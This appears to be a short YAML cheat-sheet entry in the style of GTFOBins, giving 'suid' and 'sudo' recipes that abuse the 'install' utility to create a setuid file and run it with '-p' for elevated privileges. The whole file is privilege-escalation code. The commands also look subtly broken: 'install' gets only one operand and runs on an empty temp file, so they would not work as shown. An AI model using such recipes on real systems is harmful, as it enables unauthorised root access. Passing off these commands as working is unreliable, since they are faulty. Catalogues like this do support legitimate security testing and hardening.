---
functions:
  suid:
    - code: |
        TF=$(mktemp)
        install -m 4755 $TF
        $TF -p
  sudo:
    - code: |
        TF=$(mktemp)
        sudo install -m 4755 $TF
        $TF -p
---
